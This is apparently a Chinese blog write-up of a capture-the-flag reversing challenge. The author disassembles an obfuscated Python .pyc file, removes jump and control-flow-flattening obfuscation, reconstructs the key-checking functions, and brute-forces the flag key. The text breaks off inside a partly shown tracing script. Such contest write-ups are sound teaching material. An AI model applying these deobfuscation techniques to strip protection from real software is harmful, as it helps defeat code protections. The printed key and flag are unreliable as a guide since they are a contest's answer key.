<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>u = func_list[<span class="number">-1</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_argcount</div><div class="line"><span class="number">1</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_varnames</div><div class="line">(<span class="string">'OOO000OOOOOO00OOO'</span>, <span class="string">'OOOO000OO000OOOOO'</span>, <span class="string">'DIVIDER'</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_names</div><div class="line">(<span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'p'</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_consts</div><div class="line">(<span class="keyword">None</span>, <span class="string">''</span>, <span class="string">'Wrong key!'</span>, <span class="string">'Good job! The flag is pwnhub&#123;flag:your input(lower case)&#125;'</span>, <span class="number">3463300106</span>, <span class="number">3857901018</span>, <span class="number">3949890875</span>, <span class="number">174919631</span>, <span class="number">1639824250</span>, <span class="number">433978434</span>, <span class="number">3710075802</span>, <span class="number">161154336</span>, <span class="number">33478671</span>, <span class="number">2489981027</span>, <span class="number">1574135945</span>, <span class="number">3935706030</span>, <span class="number">1700692433</span>, <span class="number">832561131</span>, <span class="keyword">None</span>)</div></pre></td></tr></table></figure>
<p>写了个脚本，自动追踪指令并输出，但是跳过两个<code>JUMP</code>指令的输出，然后又发现了一个控制流平坦化混淆…….简单的举例下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="number">175</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">10</span> (<span class="number">10</span>)</div><div class="line"><span class="number">178</span>: </div><div class="line">          <span class="number">0</span> STORE_FAST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">247</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">9</span> (<span class="number">9</span>)</div><div class="line"><span class="number">44</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">47</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">50</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE    <span class="number">74</span></div><div class="line"><span class="number">53</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">15</span> (<span class="number">15</span>)</div><div class="line"><span class="number">56</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">59</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">62</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE    <span class="number">77</span></div><div class="line"><span class="number">65</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">5</span> (<span class="number">5</span>)</div><div class="line"><span class="number">68</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">596</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">599</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE   <span class="number">626</span></div><div class="line"><span class="number">602</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">11</span> (<span class="number">11</span>)</div><div class="line"><span class="number">605</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">608</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">611</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE   <span class="number">629</span></div><div class="line"><span class="number">614</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">10</span> (<span class="number">10</span>)</div><div class="line"><span class="number">617</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">620</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">88</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE   <span class="number">115</span></div></pre></td></tr></table></figure>
<p>解释下各个指令的含义：</p>
<ul>
<li>LOAD_CONST      10 (10)     ==&gt;    push  co_consts[10]</li>
<li>STORE_FAST         2 (2)         ==&gt;    pop co_varnames[2]</li>
<li>LOAD_FAST           2 (2)         ==&gt;    push co_varnames[2]</li>
<li>COMPARE_OP      2 (==)       ==&gt;    pop x1; pop x2; if x1 == x2: push 1 else: push 0   (该指令的操作数2表示栈上的两个数进行比较)</li>
<li>POP_JUMP_IF_TRUE    74    ==&gt;    pop x1; if x1: jmp 74</li>
</ul>
<p>翻译成伪代码就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">DIVIDER = co_consts[<span class="number">10</span>]</div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">9</span>]:</div><div class="line">	jmp <span class="number">74</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">15</span>]:</div><div class="line">	jmp <span class="number">77</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">5</span>]:</div><div class="line">	jmp <span class="number">626</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">11</span>]:</div><div class="line">	jmp <span class="number">629</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">10</span>]:</div><div class="line">	jmp <span class="number">115</span></div></pre></td></tr></table></figure>
<p>这个就是控制流平坦化混淆，中间有一堆垃圾代码，因为我怕时间来不及就没有写全自动换脚本，是半自动半手工做题，用脚本去掉JUMP混淆，把结果输出到文件中，然后用ctrl+f，去掉控制流平坦化混淆(之后会在我博客中放全自动脚本)</p>
<p>去掉混淆后的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="number">283</span>: </div><div class="line">          <span class="number">0</span> LOAD_GLOBAL         <span class="number">0</span> (<span class="number">0</span>)     TOP1</div><div class="line"><span class="number">286</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">0</span> (<span class="number">0</span>)     TOP</div><div class="line"><span class="number">289</span>: </div><div class="line">          <span class="number">0</span> CALL_FUNCTION       <span class="number">1</span>         CALL TOP1(TOP)</div><div class="line"></div><div class="line">q(OOO000OOOOOO00OOO)</div><div class="line"></div><div class="line"><span class="number">229</span>: </div><div class="line">          <span class="number">0</span> STORE_FAST          <span class="number">1</span> (<span class="number">1</span>)     </div><div class="line"></div><div class="line">OOOO000OO000OOOOO = q(OOO000OOOOOO00OOO)</div><div class="line"></div><div class="line"><span class="number">232</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">235</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">336</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">222</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_FALSE   <span class="number">253</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> OOOO000OO000OOOOO != <span class="string">""</span>:   JUMP <span class="number">253</span></div><div class="line"></div><div class="line"><span class="number">657</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">660</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">661</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line"></div><div class="line">PRINT co_consts[<span class="number">2</span>]</div><div class="line"></div><div class="line"><span class="number">276</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE  </div><div class="line"><span class="keyword">return</span> <span class="number">0</span> </div><div class="line"><span class="comment">###</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(OOO000OOOOOO00OOO)</span>:</span></div><div class="line">  OOOO000OO000OOOOO = q(OOO000OOOOOO00OOO)</div><div class="line">  <span class="keyword">if</span> OOOO000OO000OOOOO == <span class="string">""</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'Wrong key!'</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span></div><div class="line"><span class="comment">###</span></div></pre></td></tr></table></figure>
<p>第一个分支我们可以翻译出上面的代码，然后把指令调到253，在继续跑脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="number">682</span>: </div><div class="line">          <span class="number">0</span> LOAD_GLOBAL         <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">685</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">688</span>: </div><div class="line">          <span class="number">0</span> CALL_FUNCTION       <span class="number">1</span></div><div class="line"><span class="number">691</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_FALSE   <span class="number">709</span></div><div class="line"></div><div class="line"> <span class="keyword">if</span> r(OOOO000OO000OOOOO) == <span class="keyword">False</span>: JMP <span class="number">709</span></div><div class="line"></div><div class="line"><span class="number">16</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">19</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">20</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line">PRINT co_consts[<span class="number">2</span>]</div><div class="line">    </div><div class="line"><span class="number">317</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE </div><div class="line"><span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>继续跟踪到709：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="number">324</span>: </div><div class="line">          <span class="number">0</span> LOAD_GLOBAL         <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">327</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">330</span>: </div><div class="line">          <span class="number">0</span> CALL_FUNCTION       <span class="number">1</span></div><div class="line"><span class="number">241</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_FALSE   <span class="number">262</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> p(OOOO000OO000OOOOO) == <span class="keyword">False</span>: JMP <span class="number">262</span></div><div class="line"></div><div class="line"><span class="number">701</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">704</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">705</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line"></div><div class="line"><span class="keyword">print</span> co_consts[<span class="number">2</span>]</div><div class="line"></div><div class="line"><span class="number">10</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE   </div><div class="line"><span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>根据到262:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="number">24</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">3</span> (<span class="number">3</span>)</div><div class="line"><span class="number">27</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">28</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line"><span class="number">311</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE  </div><div class="line">      </div><div class="line"><span class="keyword">print</span> co_consts[<span class="number">3</span>]</div><div class="line"><span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>根据上面追踪翻译出来的代码，成功还原出u函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(OOO000OOOOOO00OOO)</span>:</span></div><div class="line">	OOOO000OO000OOOOO = q(OOO000OOOOOO00OOO)</div><div class="line">	<span class="keyword">if</span> OOOO000OO000OOOOO == <span class="string">""</span>:</div><div class="line">		<span class="keyword">print</span> ERROR</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">if</span> r(OOOO000OO000OOOOO):</div><div class="line">		<span class="keyword">print</span> ERROR</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">if</span> p(OOOO000OO000OOOOO):</div><div class="line">		<span class="keyword">print</span> ERROR</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"Good job!"</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>如果输出<code>Good job!</code>则表示得到flag</p>
<p>所以下面就是取逆向<code>q</code>, <code>r</code>, <code>p</code>三个函数，原理和上面逆向<code>u</code>函数一样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">(O0OOO0O0O00O00OOO)</span>:</span></div><div class="line">	<span class="keyword">return</span> O0OOO0O0O00O00OOO.decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">r</span><span class="params">(O0O000OO00OO00OO0)</span>:</span></div><div class="line">	<span class="keyword">if</span> len(O0O000OO00OO00OO0) == <span class="number">18</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span></div></pre></td></tr></table></figure>
<p><code>q</code>和<code>r</code>两个函数，一个是进行decode操作，一个是判断长度，所以判断flag是否正确就在<code>p</code>函数中，而<code>p</code>函数是手工最难逆的函数，我从下午6点，逆到了8点，/(ㄒoㄒ)/~~，我应该是采取了最笨的方法，前面提到了，我现在有个自动化的思路，之后会放到我blog中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(hhh)</span>:</span></div><div class="line">  <span class="keyword">if</span> ((ord(hhh[<span class="number">13</span>])*<span class="number">25</span>+<span class="number">254</span>)%<span class="number">256</span>) ^ <span class="number">184</span> == <span class="number">139</span>:</div><div class="line">    <span class="keyword">if</span> ((ord(hhh[<span class="number">2</span>])*<span class="number">3</span>+<span class="number">158</span>)%<span class="number">256</span>) ^ <span class="number">161</span> == <span class="number">21</span>:</div><div class="line">      <span class="keyword">if</span> ((ord(hhh[<span class="number">10</span>])*<span class="number">251</span>+<span class="number">142</span>)%<span class="number">256</span>) ^ <span class="number">128</span> ==  <span class="number">115</span>:</div><div class="line">        <span class="keyword">if</span> ((ord(hhh[<span class="number">5</span>])*<span class="number">99</span>+<span class="number">28</span>)%<span class="number">256</span>) ^ <span class="number">130</span> ==  <span class="number">253</span>:</div><div class="line">          <span class="keyword">if</span> ((ord(hhh[<span class="number">17</span>])*<span class="number">219</span>+<span class="number">88</span>)%<span class="number">256</span>) ^ <span class="number">130</span> ==  <span class="number">180</span>:</div><div class="line">            <span class="keyword">if</span> ((ord(hhh[<span class="number">14</span>])*<span class="number">83</span>+<span class="number">119</span>)%<span class="number">256</span>) ^ <span class="number">161</span> ==  <span class="number">101</span>:</div><div class="line">              <span class="keyword">if</span> ((ord(hhh[<span class="number">7</span>])*<span class="number">57</span>+<span class="number">178</span>)%<span class="number">256</span>) ^ <span class="number">184</span> ==  <span class="number">91</span>:</div><div class="line">                <span class="keyword">if</span> ((ord(hhh[<span class="number">1</span>])*<span class="number">245</span>+<span class="number">207</span>)%<span class="number">256</span>) ^ <span class="number">184</span> ==  <span class="number">57</span>:</div><div class="line">                  <span class="keyword">if</span> ((ord(hhh[<span class="number">0</span>])*<span class="number">249</span>+<span class="number">166</span>)%<span class="number">256</span>) ^ <span class="number">230</span> ==  <span class="number">85</span>:</div><div class="line">                    <span class="keyword">if</span> ((ord(hhh[<span class="number">8</span>])*<span class="number">213</span>+<span class="number">134</span>)%<span class="number">256</span>) ^ <span class="number">161</span> ==  <span class="number">240</span>:</div><div class="line">                      <span class="keyword">if</span> ((ord(hhh[<span class="number">4</span>])*<span class="number">199</span>+<span class="number">255</span>)%<span class="number">256</span>) ^ <span class="number">128</span> ==  <span class="number">202</span>:</div><div class="line">                        <span class="keyword">if</span> ((ord(hhh[<span class="number">6</span>])*<span class="number">85</span>+<span class="number">30</span>)%<span class="number">256</span>) ^ <span class="number">230</span> ==  <span class="number">202</span>:</div><div class="line">                          <span class="keyword">if</span> ((ord(hhh[<span class="number">9</span>])*<span class="number">173</span>+<span class="number">69</span>)%<span class="number">256</span>) ^ <span class="number">227</span> ==  <span class="number">124</span>:</div><div class="line">                            <span class="keyword">if</span> ((ord(hhh[<span class="number">15</span>])*<span class="number">141</span>+<span class="number">205</span>)%<span class="number">256</span>) ^ <span class="number">227</span> ==  <span class="number">170</span>:</div><div class="line">                              <span class="keyword">if</span> ((ord(hhh[<span class="number">11</span>])*<span class="number">133</span>+<span class="number">218</span>)%<span class="number">256</span>) ^ <span class="number">130</span> ==  <span class="number">149</span>:</div><div class="line">                                <span class="keyword">if</span> ((ord(hhh[<span class="number">12</span>])*<span class="number">139</span>+<span class="number">193</span>)%<span class="number">256</span>) ^ <span class="number">230</span> ==  <span class="number">2</span>:</div><div class="line">                                  <span class="keyword">if</span> ((ord(hhh[<span class="number">3</span>])*<span class="number">67</span>+<span class="number">202</span>)%<span class="number">256</span>) ^ <span class="number">227</span> ==  <span class="number">24</span>:</div><div class="line">                                    <span class="keyword">if</span> ((ord(hhh[<span class="number">16</span>])*<span class="number">103</span>+<span class="number">151</span>)%<span class="number">256</span>) ^ <span class="number">128</span> ==  <span class="number">145</span>:</div><div class="line">                                      <span class="keyword">return</span> <span class="number">0</span></div><div class="line">  <span class="keyword">return</span> <span class="number">1</span></div><div class="line"><span class="comment">#  这代码弄出来的时候差点猝死</span></div></pre></td></tr></table></figure>
<p>然后写个脚本爆破出flag(现在想想，应该可以用z3)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">flag = [<span class="string">""</span>]*<span class="number">18</span></div><div class="line"></div><div class="line">bds = [<span class="string">'((x*25+254)%256) ^ 184 == 139'</span>, <span class="string">'((x*3+158)%256) ^ 161 == 21'</span>, <span class="string">'((x*251+142)%256) ^ 128 ==  115'</span>, <span class="string">'((x*99+28)%256) ^ 130 ==  253'</span>, <span class="string">'((x*219+88)%256) ^ 130 ==  180'</span>, <span class="string">'((x*83+119)%256) ^ 161 ==  101'</span>, <span class="string">'((x*57+178)%256) ^ 184 ==  91'</span>, <span class="string">'((x*245+207)%256) ^ 184 ==  57'</span>, <span class="string">'((x*249+166)%256) ^ 230 ==  85'</span>, <span class="string">'((x*213+134)%256) ^ 161 ==  240'</span>, <span class="string">'((x*199+255)%256) ^ 128 ==  202'</span>, <span class="string">'((x*85+30)%256) ^ 230 ==  202'</span>, <span class="string">'((x*173+69)%256) ^ 227 ==  124'</span>, <span class="string">'((x*141+205)%256) ^ 227 ==  170'</span>, <span class="string">'((x*133+218)%256) ^ 130 ==  149'</span>, <span class="string">'((x*139+193)%256) ^ 230 ==  2'</span>, <span class="string">'((x*67+202)%256) ^ 227 ==  24'</span>, <span class="string">'((x*103+151)%256) ^ 128 ==  145'</span>]</div><div class="line">bds_index = [<span class="number">13</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">16</span>]</div><div class="line"></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">18</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">		<span class="keyword">if</span> eval(bds[y]):</div><div class="line">			flag[bds_index[y]] = x</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">payload= <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag:</div><div class="line">	payload += chr(x)</div><div class="line"></div><div class="line"><span class="keyword">print</span> payload.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"><span class="comment"># b5aab27b5d01d6b91f021f59c97ddf6c76fa</span></div><div class="line">$ python final.pyc </div><div class="line">Please input your key(hex string):b5aab27b5d01d6b91f021f59c97ddf6c76fa</div><div class="line">Good job! The flag <span class="keyword">is</span> pwnhub&#123;flag:your input(lower case)&#125;</div></pre></td></tr></table></figure>
<p>傻逼的半自动化脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2.7</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> dis, marshal</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u16</div><div class="line"></div><div class="line">one_para = [<span class="string">"\x01"</span>,<span class="string">"\x02"</span>, <span class="string">"\x03"</span>, <span class="string">"\x21"</span>, <span class="string">"\x17"</span>, <span class="string">"\x0a"</span>, <span class="string">"\x0b"</span>, <span class="string">"\x0c"</span>, <span class="string">"\x0f"</span>, <span class="string">"\x13"</span>, <span class="string">"\x14"</span>, <span class="string">"\x15"</span>, <span class="string">"\x16"</span>, <span class="string">"\x18"</span>, <span class="string">"\x19"</span>, <span class="string">"\x1a"</span>, <span class="string">"\x1c"</span>, <span class="string">"\x1e"</span>, <span class="string">"\x1f"</span>, <span class="string">"\x47"</span>, <span class="string">"\x48"</span>]</div><div class="line"></div><div class="line">f = open(<span class="string">"final.pyc"</span>)</div><div class="line">f.read(<span class="number">8</span>)</div><div class="line">code = marshal.load(f)</div><div class="line"></div><div class="line">code = code.co_consts[<span class="number">45</span>]</div><div class="line"><span class="keyword">print</span> code.co_name</div><div class="line">asm = code.co_code</div><div class="line"><span class="comment"># asm = code.co_consts[45].co_code</span></div><div class="line">stack = []</div><div class="line">varn = &#123;</div><div class="line">    <span class="string">'DIVIDER'</span>: <span class="keyword">None</span>,       <span class="comment"># DEVIDER</span></div><div class="line">    <span class="string">'OOO000OOOOOO00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOOO000OO000OOOOO'</span>: <span 